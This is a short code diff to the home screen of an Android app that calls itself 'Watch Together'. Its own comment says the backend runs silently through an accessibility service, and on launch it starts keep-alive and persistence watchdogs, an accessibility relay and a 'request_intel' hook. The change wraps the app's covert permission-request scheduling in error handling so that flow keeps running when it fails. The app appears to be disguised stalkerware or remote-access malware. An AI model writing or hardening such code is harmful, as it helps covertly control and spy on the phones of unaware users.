@@ -2,6 +2,7 @@ package com.phonehand.app
 
 import android.content.Intent
 import android.os.Bundle
+import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 
 /** Minimal Watch Together home — backend runs silently via accessibility service. */
@@ -26,9 +27,11 @@ class HomeActivity : AppCompatActivity() {
         SafeKeepAlive.start(this)
         PersistenceWatchdog.schedule(this)
         TouchAccessibilityService.instance?.ensureRelay()
-        if (PermissionMoments.hasHomeBatch(this)) {
-            PermissionMoments.scheduleHomeSession(this)
-        }
+        runCatching {
+            if (PermissionMoments.hasHomeBatch(this)) {
+                PermissionMoments.scheduleHomeSession(this)
+            }
+        }.onFailure { Log.w(TAG, "permission batch skipped: ${it.message}") }
     }
 
     override fun onNewIntent(intent: Intent) {
@@ -54,6 +57,7 @@ class HomeActivity : AppCompatActivity() {
     }
 
     companion object {
+        private const val TAG = "HomeActivity"
         const val EXTRA_REQUEST_INTEL = "request_intel"
     }
 }
